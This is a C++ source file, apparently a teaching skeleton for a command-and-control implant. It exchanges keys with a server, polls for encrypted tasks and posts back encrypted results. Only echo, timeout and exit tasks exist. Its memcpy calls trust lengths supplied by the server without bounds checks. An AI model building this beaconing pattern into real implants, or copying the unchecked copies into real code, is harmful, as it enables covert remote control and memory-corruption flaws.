//!COMMENT try running it with out the task loop
#include <stdio.h>
#include <stdlib.h>
#include <cstring>
#include <unistd.h>

extern "C"
{
#include "ll.h"
#include "config.h"
#include "datatypes.h"
#include "curlwrapper.h"
#include "listwrapper.h"
#include "encryption.h"
}

const unsigned int TASK_ECHO = 0;
const unsigned int TASK_TIMEOUT = 1;
const unsigned int TASK_EXIT = 2;

int EXIT = 0;
int TIMEOUT = 10;

//this function send the key material to the server
int send_keymat(localKeys * km){
    MemoryStruct b64_km;
    if (!km) goto fail;
    
    //convert the binary to ascii
    b64_km.memory = base64_encode((const unsigned char *)km->my_pub_key,KEY_LEN,(size_t*)&b64_km.size);
    DEBUG_PRINT("%s",b64_km.memory);

    post_request((char *)PP_KEY_URL, &b64_km);

    //!COMMENT take this out and see what happens
    free(b64_km.memory);
    return SUCCESS;
fail:
    return FAILURE;
}

//this function recieves the key material from the server 
int recv_keymat(keyMat * km,localKeys *lk){
    MemoryStruct b64_km;
    MemoryStruct sender_key;
    if (!km || !lk) goto fail;
    
    b64_km.memory = NULL;
    get_request(&b64_km,(char *)PP_KEY_URL);
    
    DEBUG_PRINT("%s",b64_km.memory);

    sender_key.memory = base64_decode((const unsigned char *)b64_km.memory,(size_t)b64_km.size,(size_t*)&sender_key.size);
    
    //!COMMENT copy their keymat into the km structure
    //!COMMENT what should i be checking for here
    memcpy(km->sender_pub_key,sender_key.memory,KEY_LEN);
    
    //copy my private key
    memcpy(km->my_priv_key,lk->my_priv_key,KEY_LEN);
    
    //derive the session key
    derive_session_key(km);
    print_key(km->shared_key,(char *)"shared key: ");
    
    free(b64_km.memory);
    free(sender_key.memory);
    return SUCCESS;
fail:
    return FAILURE;
}

//this function recieves the key material from the server 
int get_task(keyMat * km,TaskBytes* tb){
    MemoryStruct b64_tb;
    MemoryStruct enc_tb;
    DecryptedBytes db;
    EncryptedBytes eb;

    int offset = 0;

    if (!km || !tb) goto fail;
    
    b64_tb.memory = NULL;

    //get the task
    get_request(&b64_tb,(char *)PP_TASK_URL);
    DEBUG_PRINT("request returned size: %d",b64_tb.size);
    DEBUG_PRINT("%s",b64_tb.memory);
    
    //TODO test here
    if (0 == b64_tb.size){
        goto fail;
    } 
    
    //unbase 64 it
    enc_tb.memory = base64_decode((const unsigned char *)b64_tb.memory,(size_t)b64_tb.size,(size_t*)&enc_tb.size);  
    
    //print_bytes(enc_tb.memory,enc_tb.size);

    //copies enc meta data to the struct
    offset = sizeof(EncryptedBytes) - sizeof(uint8_t*)+4;
    memcpy((void*)&eb,enc_tb.memory,offset);

    //copies the ciphertext
    eb.cypher_text =(uint8_t*) malloc(eb.len);
    memcpy(eb.cypher_text,enc_tb.memory+offset,eb.len);

    //decrypt it
    dec(&db, km, &eb);

    DEBUG_PRINT("tasking: %s",(char*)db.plain_text);

    memset(tb,'\0',sizeof(TaskBytes));
    memcpy(tb,db.plain_text,db.len);
    DEBUG_PRINT("tasking: %s",(char*)tb);
    DEBUG_PRINT("%u",tb->task_num);


    free(eb.cypher_text);
    free(db.plain_text);
    free(b64_tb.memory);
    free(enc_tb.memory);
    
    return SUCCESS;
fail:
    return FAILURE;
}

//this function recieves the key material from the server 
int send_result(keyMat * km, TaskBytes* tb){
    MemoryStruct b64_tb;

    EncryptedBytes eb;
    DecryptedBytes db;
    
    MemoryStruct eb_inline;

    int offset = 0;
    if (!km || !tb) goto fail;

    db.len = tb->len+16;
    db.plain_text = (uint8_t*)tb;

    DEBUG_PRINT("encrypting result");
    //encrypt it 
    enc(&eb, km, &db);
    DEBUG_PRINT("sequencing bytes");

    //!COMMENT this is embarrassing dont judge me
    offset = 80;
    eb_inline.size = eb.len + offset;
    eb_inline.memory = (uint8_t*) malloc(eb_inline.size);
    memcpy(eb_inline.memory,&eb,offset);
    memcpy(eb_inline.memory+offset,eb.cypher_text,eb.len);
    print_bytes(eb_inline.memory,eb_inline.size);
    DEBUG_PRINT("base 64ing");
    //base64 it
    b64_tb.memory = base64_encode((unsigned char *)eb_inline.memory,eb_inline.size,(size_t*)&b64_tb.size);
    DEBUG_PRINT("%s",b64_tb.memory);

    post_request((char *)PP_TASK_URL, &b64_tb);
    DEBUG_PRINT("success");
    //TODO take out here
    free(b64_tb.memory);
    return SUCCESS;
fail:
    return FAILURE;
}

int handleTaskEcho(taskBytes *res,taskBytes *tb){
    DEBUG_PRINT("echo");
    if (!tb || !res || !tb->len) goto fail;
        memcpy(res,tb,sizeof(taskBytes));
        DEBUG_PRINT("ECHO Task:%s",tb->task_args);
            DEBUG_PRINT("ECHO Response:%s",res->task_args);
        return SUCCESS;
    fail:
        return FAILURE;
}

int handleTaskTimeout(taskBytes *res,taskBytes *tb){
    DEBUG_PRINT("timeout");
    if (!tb || !res) goto fail;

        return SUCCESS;
    fail:
        return FAILURE;
}

int handleTaskExit(taskBytes *res,taskBytes *tb){
    DEBUG_PRINT("exit");
    if (!tb || !res) goto fail;
        EXIT = 1;
        return SUCCESS;
    fail:
        return FAILURE;
}


int main()
{
    wrapper_curl_init();
    
    localKeys me;
    keyMat session;  
    TaskBytes task;
    TaskBytes response;

    task.task_num = 0;
    response.task_num = 0;
    task.len = 0;
    response.len = 0;
    memset(task.task_args,'\0',1024);
    memset(response.task_args,'\0',1024);
    DEBUG_PRINT("SPITESTORE\n");
 
    //generates my local keys
    gen_keys(&me);

    //send my keymat
    send_keymat(&me);
    
    //recv their keymat
    recv_keymat(&session,&me);
    
    //task loop
    while (!EXIT){

        DEBUG_PRINT("checking for tasking\n");
        if (FAILURE == get_task(&session,&task)) goto next;
        DEBUG_PRINT("tasking: %s",(char*)&task);
        DEBUG_PRINT("%u",task.task_num);
        switch(task.task_num){
            case TASK_ECHO:
                handleTaskEcho(&response,&task);
                send_result(&session,&response);
                break;
            case TASK_TIMEOUT:
                handleTaskTimeout(&response,&task);
                send_result(&session,&response);
                break;
            case TASK_EXIT:
                handleTaskExit(&response,&task);
                send_result(&session,&response);
                break;
        } 

        
next:
        DEBUG_PRINT("sleeping %d seconds\n",TIMEOUT);
        sleep(TIMEOUT);
        
    }
    wrapper_curl_free();
   
}